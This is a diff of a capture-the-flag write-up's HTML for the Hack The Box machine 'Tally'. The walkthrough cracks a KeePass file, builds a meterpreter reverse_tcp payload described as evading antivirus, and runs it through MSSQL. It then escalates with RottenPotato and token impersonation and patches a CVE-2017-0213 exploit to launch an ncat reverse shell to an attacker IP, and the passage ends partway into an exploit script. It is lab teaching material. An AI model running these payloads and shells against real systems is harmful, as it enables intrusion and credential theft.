+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">FTP details
+</span></span><span class="line"><span class="cl">hostname: tally
+</span></span><span class="line"><span class="cl">workgroup: htb.local
+</span></span><span class="line"><span class="cl">password: UTDRSCH53c&#34;$6hys
+</span></span><span class="line"><span class="cl">Please create your own user folder upon logging in</span></span></code></pre></div></p>
 
 <p>Now, we know the FTP password but we lack the username. If we set a cookie named &ldquo;mobile&rdquo; equal to 1 (i.e. mobile=1) and reload the site, a gear appears at the top-right corner. We can click on that gear and select &ldquo;Site Contents&rdquo; and then &ldquo;Site Pages&rdquo;. There, we find an interesting link named &ldquo;FinanceTeam.aspx&rdquo; (again by tally\administrator). I originally found the gear by emulating a mobile device via my browser (using developer tools, google it if you don&rsquo;t know what I am talking about). When I reloaded the site, the gear appeared at the top-right corner.</p>
 
 <p>Let&rsquo;s visit that link:</p>
 
 <p><a href="http://10.10.10.59/_layouts/15/mobile/mblwikia.aspx?Url=%2FSitePages%2FFinanceTeam%2Easpx&amp;Source=%2F_layouts%2F15%2Fmobile%2Fviewa%2Easpx%3FList%3D076fa50e%252Dcea0%252D431a%252Dad18%252Dd528cf893d4c%26View%3Dee7b270d%252D91a9%252D482d%252Db7f2%252Df905c4b15281" target="_blank">http://10.10.10.59/_layouts/15/mobile/mblwikia.aspx?Url=%2FSitePages%2FFinanceTeam%2Easpx&amp;Source=%2F_layouts%2F15%2Fmobile%2Fviewa%2Easpx%3FList%3D076fa50e%252Dcea0%252D431a%252Dad18%252Dd528cf893d4c%26View%3Dee7b270d%252D91a9%252D482d%252Db7f2%252Df905c4b15281</a>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">Migration update
-
-Hi all,
-
-Welcome to your new team page!
-
-As always, there&#39;s still a few finishing touches to make.  Rahul - please upload the design mock ups to the Intranet folder as &#39;index.html&#39; using the ftp_user account - I aim to review regularly.
-
-We&#39;ll also add the fund and client account pages in due course.
-
-Thanks – Sarah &amp; Tim.</code></pre></div></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">Migration update
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Hi all,
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Welcome to your new team page!
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">As always, there&#39;s still a few finishing touches to make.  Rahul - please upload the design mock ups to the Intranet folder as &#39;index.html&#39; using the ftp_user account - I aim to review regularly.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">We&#39;ll also add the fund and client account pages in due course.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Thanks – Sarah &amp; Tim.</span></span></code></pre></div></p>
 
 <p>Therefore our FTP credentials are ftp_user:UTDRSCH53c&rdquo;$6hys</p>
 
 <h2 id="getting-smb-credentials">Getting SMB credentials</h2>
 
 <p>Connect using FTP and have a look in /User/Tim/log/do to.txt
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">To do:
-Remove migration folder
-Set secure share permissions
-encrypted share creds:
-password in keepass</code></pre></div></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">To do:
+</span></span><span class="line"><span class="cl">Remove migration folder
+</span></span><span class="line"><span class="cl">Set secure share permissions
+</span></span><span class="line"><span class="cl">encrypted share creds:
+</span></span><span class="line"><span class="cl">password in keepass</span></span></code></pre></div></p>
 
 <p>Let&rsquo;s download /User/Tim/Files/tim.kdbx and crack it:
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="go">keepass2john tim.kdbx &gt; hash
-</span><span class="go">john --format=KeePass --wordlist=/usr/share/dict/rockyou.txt hash
-</span><span class="go">tim:simplementeyo
-</span></code></pre></div></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">keepass2john tim.kdbx &gt; hash
+</span></span></span><span class="line"><span class="cl"><span class="go">john --format=KeePass --wordlist=/usr/share/dict/rockyou.txt hash
+</span></span></span><span class="line"><span class="cl"><span class="go">tim:simplementeyo
+</span></span></span></code></pre></div></div></p>
 
 <p>Now open tim.kbdx using keepass (Master password: simplementeyo)
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>keepass tim.kbdx
-</code></pre></div></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> keepass tim.kbdx
+</span></span></code></pre></div></div></p>
 
 <p>Go to Database -&gt; WORK -&gt; WINDOWS -&gt; Shares. Here, we found some SMB credentials Finance:Acc0unting (right click and copy password to get the password)</p>
 
 <h2 id="getting-mssql-credentials">Getting MSSQL credentials</h2>
 
 <p>Let&rsquo;s connect to SMB:
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>smbclient -U Finance <span class="se">\\\\</span>10.10.10.59<span class="se">\\</span>ACCT
-</code></pre></div></div>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> smbclient -U Finance <span class="se">\\\\</span>10.10.10.59<span class="se">\\</span>ACCT
+</span></span></code></pre></div></div>
 or
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>sudo mount -t cifs //10.10.10.59/ACCT /mnt/TEMP -o,user<span class="o">=</span>Finance,password<span class="o">=</span>Acc0unting,vers<span class="o">=</span>2.0
-</code></pre></div></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> sudo mount -t cifs //10.10.10.59/ACCT /mnt/TEMP -o,user<span class="o">=</span>Finance,password<span class="o">=</span>Acc0unting,vers<span class="o">=</span>2.0
+</span></span></code></pre></div></div></p>
 
 <p>Inside the smb:\zz_Migration\Binaries\new Folder\tester.exe we find this:
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">DRIVER={SQL Server};SERVER=TALLY, 1433;DATABASE=orcharddb;UID=sa;PWD=GWE3V65#6KFH93@4GWTG2G;</code></pre></div></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">DRIVER={SQL Server};SERVER=TALLY, 1433;DATABASE=orcharddb;UID=sa;PWD=GWE3V65#6KFH93@4GWTG2G;</span></span></code></pre></div></p>
 
 <p>This means our MSSQL credentials are sa:GWE3V65#6KFH93@4GWTG2G</p>
 
 <h2 id="getting-shell">Getting shell</h2>
 
 <p>Let&rsquo;s make a meterpreter payload using msfvenom. If we use the <strong>psh-reflection</strong> format our payload invade the antivirus detection:
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>msfvenom -p windows/x64/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.14.105 <span class="nv">LPORT</span><span class="o">=</span><span class="m">60000</span> -f psh-reflection -o msf.ps1
-</code></pre></div></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> msfvenom -p windows/x64/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.14.105 <span class="nv">LPORT</span><span class="o">=</span><span class="m">60000</span> -f psh-reflection -o msf.ps1
+</span></span></code></pre></div></div></p>
 
 <p>Don&rsquo;t forget to set up your listener using exploit/multi/handler:
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="go">msf&gt; use exploit/multi/handler
-</span><span class="go">msf exploit(handler) &gt; options
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">Module options (exploit/multi/handler):
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">Payload options (windows/x64/meterpreter/reverse_tcp):
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">   Name      Current Setting  Required  Description
-</span><span class="go">   ----      ---------------  --------  -----------
-</span><span class="go">   EXITFUNC  process          yes       Exit technique (Accepted: &#39;&#39;, seh, thread, process, none)
-</span><span class="go">   LHOST     10.10.14.105     yes       The listen address
-</span><span class="go">   LPORT     60000            yes       The listen port
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">msf exploit(handler) &gt; exploit
-</span><span class="go">[*] Started reverse TCP handler on 127.0.0.1:6000
-</span></code></pre></div></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">msf&gt; use exploit/multi/handler
+</span></span></span><span class="line"><span class="cl"><span class="go">msf exploit(handler) &gt; options
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Module options (exploit/multi/handler):
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Payload options (windows/x64/meterpreter/reverse_tcp):
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">   Name      Current Setting  Required  Description
+</span></span></span><span class="line"><span class="cl"><span class="go">   ----      ---------------  --------  -----------
+</span></span></span><span class="line"><span class="cl"><span class="go">   EXITFUNC  process          yes       Exit technique (Accepted: &#39;&#39;, seh, thread, process, none)
+</span></span></span><span class="line"><span class="cl"><span class="go">   LHOST     10.10.14.105     yes       The listen address
+</span></span></span><span class="line"><span class="cl"><span class="go">   LPORT     60000            yes       The listen port
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">msf exploit(handler) &gt; exploit
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Started reverse TCP handler on 127.0.0.1:6000
+</span></span></span></code></pre></div></div></p>
 
 <p>Now, upload msf.ps1 to /Intranet via FTP. We can execute our payload via MSSQL:
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>msfconsole
-<span class="go">msf&gt; use  auxiliary/admin/mssql/mssql_exec
-</span><span class="go">msf auxiliary(mssql_exec) &gt; set CMD &#34;powershell -ExecutionPolicy bypass -NoExit -File C:\\FTP\\Intranet\\msf.ps1&#34;
-</span><span class="go">msf auxiliary(mssql_exec) &gt; info
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">Basic options:
-</span><span class="go">  Name             Current Setting
-</span><span class="go">  ----             ---------------
-</span><span class="go">  CMD              powershell -ExecutionPolicy bypass -NoExit -File C:\FTP\Intranet\msf.ps1
-</span><span class="go">  PASSWORD         GWE3V65#6KFH93@4GWTG2G
-</span><span class="go">  RHOST            10.10.10.59
-</span><span class="go">  RPORT            1433
-</span><span class="go">  TDSENCRYPTION    false
-</span><span class="go">  USERNAME         sa
-</span><span class="go">  USE_WINDOWS_AUTH false
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">msf auxiliary(mssql_exec) &gt; exploit
-</span></code></pre></div></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> msfconsole
+</span></span><span class="line"><span class="cl"><span class="go">msf&gt; use  auxiliary/admin/mssql/mssql_exec
+</span></span></span><span class="line"><span class="cl"><span class="go">msf auxiliary(mssql_exec) &gt; set CMD &#34;powershell -ExecutionPolicy bypass -NoExit -File C:\\FTP\\Intranet\\msf.ps1&#34;
+</span></span></span><span class="line"><span class="cl"><span class="go">msf auxiliary(mssql_exec) &gt; info
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Basic options:
+</span></span></span><span class="line"><span class="cl"><span class="go">  Name             Current Setting
+</span></span></span><span class="line"><span class="cl"><span class="go">  ----             ---------------
+</span></span></span><span class="line"><span class="cl"><span class="go">  CMD              powershell -ExecutionPolicy bypass -NoExit -File C:\FTP\Intranet\msf.ps1
+</span></span></span><span class="line"><span class="cl"><span class="go">  PASSWORD         GWE3V65#6KFH93@4GWTG2G
+</span></span></span><span class="line"><span class="cl"><span class="go">  RHOST            10.10.10.59
+</span></span></span><span class="line"><span class="cl"><span class="go">  RPORT            1433
+</span></span></span><span class="line"><span class="cl"><span class="go">  TDSENCRYPTION    false
+</span></span></span><span class="line"><span class="cl"><span class="go">  USERNAME         sa
+</span></span></span><span class="line"><span class="cl"><span class="go">  USE_WINDOWS_AUTH false
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">msf auxiliary(mssql_exec) &gt; exploit
+</span></span></span></code></pre></div></div></p>
 
 <p>And here is our meterpreter shell:
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="go">meterpreter &gt; sysinfo
-</span><span class="go">Computer        : TALLY
-</span><span class="go">OS              : Windows 2016 (Build 14393).
-</span><span class="go">Architecture    : x64
-</span><span class="go">System Language : en_GB
-</span><span class="go">Domain          : HTB.LOCAL
-</span><span class="go">Logged On Users : 7
-</span><span class="go">Meterpreter     : x64/windows
-</span></code></pre></div></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">meterpreter &gt; sysinfo
+</span></span></span><span class="line"><span class="cl"><span class="go">Computer        : TALLY
+</span></span></span><span class="line"><span class="cl"><span class="go">OS              : Windows 2016 (Build 14393).
+</span></span></span><span class="line"><span class="cl"><span class="go">Architecture    : x64
+</span></span></span><span class="line"><span class="cl"><span class="go">System Language : en_GB
+</span></span></span><span class="line"><span class="cl"><span class="go">Domain          : HTB.LOCAL
+</span></span></span><span class="line"><span class="cl"><span class="go">Logged On Users : 7
+</span></span></span><span class="line"><span class="cl"><span class="go">Meterpreter     : x64/windows
+</span></span></span></code></pre></div></div></p>
 
 <h1 id="privilege-escalation">Privilege Escalation</h1>
 
 <h2 id="using-incognito-and-rottenpotato">Using Incognito and RottenPotato</h2>
 
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="go">meterpreter &gt; getprivs
-</span><span class="go">============================================================
-</span><span class="go">Enabled Process Privileges
-</span><span class="go">============================================================
-</span><span class="go">  SeAssignPrimaryTokenPrivilege
-</span><span class="go">  SeChangeNotifyPrivilege
-</span><span class="go">  SeCreateGlobalPrivilege
-</span><span class="go">  SeImpersonatePrivilege
-</span><span class="go">  SeIncreaseQuotaPrivilege
-</span><span class="go">  SeIncreaseWorkingSetPrivilege
-</span><span class="go"></span><span class="err">
-</span><span class="err">
-</span><span class="err"></span><span class="go">meterpreter &gt; cd C:\\Users\\Sarah\\Desktop
-</span><span class="go">meterpreter &gt; upload rottenpotato.exe
-</span><span class="go">[*] uploading  : rottenpotato.exe -&gt; rottenpotato.exe
-</span><span class="go">[*] uploaded   : rottenpotato.exe -&gt; rottenpotato.exe
-</span><span class="go"></span><span class="err">
-</span><span class="err">
-</span><span class="err"></span><span class="go">meterpreter &gt; load incognito
-</span><span class="go">Loading extension incognito...success.
-</span><span class="go"></span><span class="err">
-</span><span class="err">
-</span><span class="err"></span><span class="go">meterpreter &gt; list_tokens -u
-</span><span class="go">[-] Warning: Not currently running as SYSTEM, not all tokens will be available
-</span><span class="go">             Call rev2self if primary process token is SYSTEM
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">Delegation Tokens Available
-</span><span class="go">========================================
-</span><span class="go">TALLY\Sarah
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">Impersonation Tokens Available
-</span><span class="go">========================================
-</span><span class="go">NT SERVICE\SQLSERVERAGENT
-</span><span class="go"></span><span class="err">
-</span><span class="err">
-</span><span class="err"></span><span class="go">meterpreter &gt; execute -Hc -f C:\\Users\\Sarah\\Desktoprottenpotato.exe
-</span><span class="go">Process 7996 created.
-</span><span class="go">Channel 2 created.
-</span><span class="go"></span><span class="err">
-</span><span class="err">
-</span><span class="err"></span><span class="go">meterpreter &gt; list_tokens -u
-</span><span class="go">[-] Warning: Not currently running as SYSTEM, not all tokens will be available
-</span><span class="go">             Call rev2self if primary process token is SYSTEM
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">Delegation Tokens Available
-</span><span class="go">========================================
-</span><span class="go">TALLY\Sarah
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">Impersonation Tokens Available
-</span><span class="go">========================================
-</span><span class="go">NT AUTHORITY\SYSTEM
-</span><span class="go">NT SERVICE\SQLSERVERAGENT
-</span><span class="go"></span><span class="err">
-</span><span class="err">
-</span><span class="err"></span><span class="go">meterpreter &gt; impersonate_token &#34;NT AUTHORITY\\SYSTEM&#34;
-</span><span class="go">[-] Warning: Not currently running as SYSTEM, not all tokens will be available
-</span><span class="go">             Call rev2self if primary process token is SYSTEM
-</span><span class="go">[-] No delegation token available
-</span><span class="go">[+] Successfully impersonated user NT AUTHORITY\SYSTEM
-</span><span class="go"></span><span class="err">
-</span><span class="err">
-</span><span class="err"></span><span class="go">meterpreter &gt; shell
-</span><span class="go">Process 3452 created.
-</span><span class="go">Channel 3 created.
-</span><span class="go">Microsoft Windows [Version 10.0.14393]
-</span><span class="go">(c) 2016 Microsoft Corporation. All rights reserved.
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">C:\Users\Sarah\Desktop&gt; whoami
-</span><span class="go">nt authority\system :D
-</span></code></pre></div></div>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">meterpreter &gt; getprivs
+</span></span></span><span class="line"><span class="cl"><span class="go">============================================================
+</span></span></span><span class="line"><span class="cl"><span class="go">Enabled Process Privileges
+</span></span></span><span class="line"><span class="cl"><span class="go">============================================================
+</span></span></span><span class="line"><span class="cl"><span class="go">  SeAssignPrimaryTokenPrivilege
+</span></span></span><span class="line"><span class="cl"><span class="go">  SeChangeNotifyPrivilege
+</span></span></span><span class="line"><span class="cl"><span class="go">  SeCreateGlobalPrivilege
+</span></span></span><span class="line"><span class="cl"><span class="go">  SeImpersonatePrivilege
+</span></span></span><span class="line"><span class="cl"><span class="go">  SeIncreaseQuotaPrivilege
+</span></span></span><span class="line"><span class="cl"><span class="go">  SeIncreaseWorkingSetPrivilege
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">meterpreter &gt; cd C:\\Users\\Sarah\\Desktop
+</span></span></span><span class="line"><span class="cl"><span class="go">meterpreter &gt; upload rottenpotato.exe
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] uploading  : rottenpotato.exe -&gt; rottenpotato.exe
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] uploaded   : rottenpotato.exe -&gt; rottenpotato.exe
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">meterpreter &gt; load incognito
+</span></span></span><span class="line"><span class="cl"><span class="go">Loading extension incognito...success.
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">meterpreter &gt; list_tokens -u
+</span></span></span><span class="line"><span class="cl"><span class="go">[-] Warning: Not currently running as SYSTEM, not all tokens will be available
+</span></span></span><span class="line"><span class="cl"><span class="go">             Call rev2self if primary process token is SYSTEM
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Delegation Tokens Available
+</span></span></span><span class="line"><span class="cl"><span class="go">========================================
+</span></span></span><span class="line"><span class="cl"><span class="go">TALLY\Sarah
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Impersonation Tokens Available
+</span></span></span><span class="line"><span class="cl"><span class="go">========================================
+</span></span></span><span class="line"><span class="cl"><span class="go">NT SERVICE\SQLSERVERAGENT
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">meterpreter &gt; execute -Hc -f C:\\Users\\Sarah\\Desktoprottenpotato.exe
+</span></span></span><span class="line"><span class="cl"><span class="go">Process 7996 created.
+</span></span></span><span class="line"><span class="cl"><span class="go">Channel 2 created.
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">meterpreter &gt; list_tokens -u
+</span></span></span><span class="line"><span class="cl"><span class="go">[-] Warning: Not currently running as SYSTEM, not all tokens will be available
+</span></span></span><span class="line"><span class="cl"><span class="go">             Call rev2self if primary process token is SYSTEM
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Delegation Tokens Available
+</span></span></span><span class="line"><span class="cl"><span class="go">========================================
+</span></span></span><span class="line"><span class="cl"><span class="go">TALLY\Sarah
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Impersonation Tokens Available
+</span></span></span><span class="line"><span class="cl"><span class="go">========================================
+</span></span></span><span class="line"><span class="cl"><span class="go">NT AUTHORITY\SYSTEM
+</span></span></span><span class="line"><span class="cl"><span class="go">NT SERVICE\SQLSERVERAGENT
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">meterpreter &gt; impersonate_token &#34;NT AUTHORITY\\SYSTEM&#34;
+</span></span></span><span class="line"><span class="cl"><span class="go">[-] Warning: Not currently running as SYSTEM, not all tokens will be available
+</span></span></span><span class="line"><span class="cl"><span class="go">             Call rev2self if primary process token is SYSTEM
+</span></span></span><span class="line"><span class="cl"><span class="go">[-] No delegation token available
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] Successfully impersonated user NT AUTHORITY\SYSTEM
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">meterpreter &gt; shell
+</span></span></span><span class="line"><span class="cl"><span class="go">Process 3452 created.
+</span></span></span><span class="line"><span class="cl"><span class="go">Channel 3 created.
+</span></span></span><span class="line"><span class="cl"><span class="go">Microsoft Windows [Version 10.0.14393]
+</span></span></span><span class="line"><span class="cl"><span class="go">(c) 2016 Microsoft Corporation. All rights reserved.
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">C:\Users\Sarah\Desktop&gt; whoami
+</span></span></span><span class="line"><span class="cl"><span class="go">nt authority\system :D
+</span></span></span></code></pre></div></div>
 
 <h2 id="using-cve-2017-213">Using CVE-2017-213</h2>
 
@@ -683,9 +683,9 @@ or
 <li><p><a href="https://github.com/WindowsExploits/Exploits/blob/master/CVE-2017-0213/Source/CVE-2017-0213.cpp" target="_blank">https://github.com/WindowsExploits/Exploits/blob/master/CVE-2017-0213/Source/CVE-2017-0213.cpp</a></p></li>
 
 <li><p>Change the cmdline in CVE-2017-0213.cpp to run ncat or a powershell script to get a remote shell. E.g.:
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="n">WCHAR</span> <span class="n">cmdline</span><span class="p">[]</span> <span class="o">=</span> <span class="s">&#34;C:</span><span class="se">\\</span><span class="s">Users</span><span class="se">\\</span><span class="s">Sarah</span><span class="se">\\</span><span class="s">Desktop</span><span class="se">\\</span><span class="s">ncat.exe 10.10.14.190 60002 -e cmd.exe&#34;</span></code></pre></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="n">WCHAR</span> <span class="n">cmdline</span><span class="p">[]</span> <span class="o">=</span> <span class="s">&#34;C:</span><span class="se">\\</span><span class="s">Users</span><span class="se">\\</span><span class="s">Sarah</span><span class="se">\\</span><span class="s">Desktop</span><span class="se">\\</span><span class="s">ncat.exe 10.10.14.190 60002 -e cmd.exe&#34;</span></span></span></code></pre></div>
 or
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="n">WCHAR</span> <span class="n">cmdline</span><span class="p">[]</span> <span class="o">=</span> <span class="sa">L</span><span class="s">&#34;powershell -ExecutionPolicy bypass -NoExit -File C:</span><span class="se">\\</span><span class="s">FTP</span><span class="se">\\</span><span class="s">Intranet</span><span class="se">\\</span><span class="s">shell.ps1&#34;</span><span class="p">;</span></code></pre></div></p></li>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="n">WCHAR</span> <span class="n">cmdline</span><span class="p">[]</span> <span class="o">=</span> <span class="sa">L</span><span class="s">&#34;powershell -ExecutionPolicy bypass -NoExit -File C:</span><span class="se">\\</span><span class="s">FTP</span><span class="se">\\</span><span class="s">Intranet</span><span class="se">\\</span><span class="s">shell.ps1&#34;</span><span class="p">;</span></span></span></code></pre></div></p></li>
 
 <li><p>Compile it, upload it and copy it in a folder where user has write permissions.</p></li>
 
@@ -700,175 +700,175 @@ or
 <a href="https://github.com/Alamot/code-snippets/tree/master/hacking/HTB/Tally" target="_blank">https://github.com/Alamot/code-snippets/tree/master/hacking/HTB/Tally</a></p>
 
 <p>(Don&rsquo;t forget to set LHOST appropriately. If you are using a Linux OS, the script tries to automatically get the LHOST IP from the tun0 interface).
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/env python2</span>
-<span class="c1"># Author: Alamot</span>
-<span class="kn">import</span> <span class="nn">sys</span>
-<span class="kn">import</span> <span class="nn">uuid</span>
-<span class="kn">import</span> <span class="nn">fcntl</span>
-<span class="kn">import</span> <span class="nn">_mssql</span>
-<span class="kn">import</span> <span class="nn">signal</span>
-<span class="kn">import</span> <span class="nn">ftplib</span>
-<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
-<span class="kn">from</span> <span class="nn">subprocess</span> <span class="kn">import</span> <span class="n">call</span>
-<span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="n">b64encode</span>
-<span class="n">signal</span><span class="o">.</span><span class="n">signal</span><span class="p">(</span><span class="n">signal</span><span class="o">.</span><span class="n">SIGINT</span><span class="p">,</span> <span class="n">signal</span><span class="o">.</span><span class="n">SIG_DFL</span><span class="p">)</span>
-
-
-<span class="k">def</span> <span class="nf">get_ip_address</span><span class="p">(</span><span class="n">ifname</span><span class="p">):</span>
-    <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_DGRAM</span><span class="p">)</span>
-    <span class="k">return</span> <span class="n">socket</span><span class="o">.</span><span class="n">inet_ntoa</span><span class="p">(</span><span class="n">fcntl</span><span class="o">.</span><span class="n">ioctl</span><span class="p">(</span>
-        <span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span>
-        <span class="mh">0x8915</span><span class="p">,</span>  <span class="c1"># SIOCGIFADDR</span>
-        <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">&#39;256s&#39;</span><span class="p">,</span> <span class="n">ifname</span><span class="p">[:</span><span class="mi">15</span><span class="p">]</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
-    <span class="p">)[</span><span class="mi">20</span><span class="p">:</span><span class="mi">24</span><span class="p">])</span>
-
-
-<span class="c1">#LHOST = &#34;10.10.15.247&#34;</span>
-<span class="n">LHOST</span> <span class="o">=</span> <span class="n">get_ip_address</span><span class="p">(</span><span class="s1">&#39;tun0&#39;</span><span class="p">)</span>
-<span class="n">LPORT1</span><span class="o">=</span><span class="s2">&#34;60000&#34;</span>
-<span class="n">LPORT2</span><span class="o">=</span><span class="s2">&#34;60001&#34;</span>
-<span class="n">LPORT3</span><span class="o">=</span><span class="s2">&#34;60002&#34;</span>
-<span class="n">FTP_SERVER</span> <span class="o">=</span> <span class="s2">&#34;10.10.10.59&#34;</span>
-<span class="n">FTP_USERNAME</span> <span class="o">=</span> <span class="s2">&#34;ftp_user&#34;</span>
